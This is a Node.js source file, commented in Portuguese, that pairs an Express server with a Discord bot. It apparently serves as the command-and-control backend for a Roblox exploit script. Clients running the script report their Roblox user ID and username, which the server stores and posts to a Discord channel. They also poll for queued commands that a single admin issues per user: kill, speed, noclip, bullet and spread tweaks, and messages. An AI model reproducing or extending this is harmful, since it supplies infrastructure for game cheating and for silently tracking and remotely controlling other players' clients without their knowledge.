const express = require("express");
const fs = require("fs");
const { Client, GatewayIntentBits } = require("discord.js");

const app = express();
app.use(express.json());

// ===== CONFIG =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const CANAL_DESTINO = process.env.CANAL_DESTINO;
const ADMIN_ID = "1163467888259239996"; // Somente este usuário pode usar comandos

// ===== DATABASE =====
let db = { users: [] };

function saveDB() {
    fs.writeFileSync("db.json", JSON.stringify(db, null, 2));
}

if (fs.existsSync("db.json")) {
    db = JSON.parse(fs.readFileSync("db.json"));
}

// ===== COMANDOS EM FILA =====
let commands = [];

// ===== DISCORD BOT =====
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once("ready", () => {
    console.log("Bot iniciado!");
});

// ===== COMANDOS =====
client.on("messageCreate", async (msg) => {
    if (msg.author.id !== ADMIN_ID) return; // Apenas admin
    if (!msg.content.startsWith(".")) return;

    const args = msg.content.split(" ");
    const cmd = args[0].substring(1); // remove "."

    if (cmd === "cmds") {
        const cmds = [
            ".on",
            ".off",
            ".help",
            ".kill",
            ".speed <v>",
            ".unspeed",
            ".noclip",
            ".clip",
            ".togglenoclip",
            ".spread <v>",
            ".range <v>",
            ".bullets <v>",
            ".message <user> <content>"
        ];
        return msg.reply("**Comandos:**\n" + cmds.join("\n"));
    }

    if (cmd === "on") {
        if (db.users.length === 0) return msg.reply("Nenhum usuário ativo.");
        const names = db.users.map(u => `[${u.username}](https://www.roblox.com/users/${u.userId}/profile)`);
        return msg.reply(`**Usuários ativos (${db.users.length}):**\n${names.join("\n")}`);
    }

    const targetUser = args[1]?.toLowerCase();

    if (!targetUser && cmd !== "on" && cmd !== "cmds") {
        return msg.reply("Use: .comando username argumentos");
    }

    if (cmd === "message") {
        const content = args.slice(2).join(" ");
        if (!content) return msg.reply("Use: .message <username> <conteúdo>");
        commands.push({ user: targetUser, command: "message", content });
        return msg.reply(`Mensagem enviada para **${targetUser}**.`);
    }

    const c = {
        user: targetUser,
        command: cmd,
        arg1: args[2],
        arg2: args[3]
    };
    commands.push(c);
    msg.reply(`Comando **${cmd}** enviado para **${targetUser}**.`);
});

// ===== ENDPOINT PARA O SCRIPT PEGAR COMANDO =====
app.post("/nextCommand", (req, res) => {
    const username = req.body.username?.toLowerCase();
    if (!username) return res.json({ command: null });

    const found = commands.find(c => c.user === username);

    if (found) {
        commands = commands.filter(c => c !== found);
        return res.json(found);
    }

    return res.json({ command: null });
});

// ===== ENDPOINT PARA LOG DO ROBLOX =====
app.post("/log", async (req, res) => {
    const { userId, username } = req.body;
    if (!userId || !username) return res.status(400).send("Requisição inválida.");

    if (!db.users.some(u => u.userId === userId)) {
        db.users.push({ userId, username });
        saveDB();
        const channel = await client.channels.fetch(CANAL_DESTINO);

        const msg = `📌 **USUÁRIO NOVO**
**Usuário:** [${username}](https://www.roblox.com/users/${userId}/profile)
`;
        channel.send(msg);
    }
    res.send("OK");
});

// ===== ENDPOINT PARA REMOVER USUÁRIO =====
app.post("/removeUser", (req, res) => {
    const { userId } = req.body;
    if (!userId) return res.status(400).send("Requisição inválida.");
    db.users = db.users.filter(u => u.userId !== userId);
    saveDB();
    res.send("OK");
});

// ===== START =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Servidor rodando na porta " + PORT));

client.login(BOT_TOKEN);
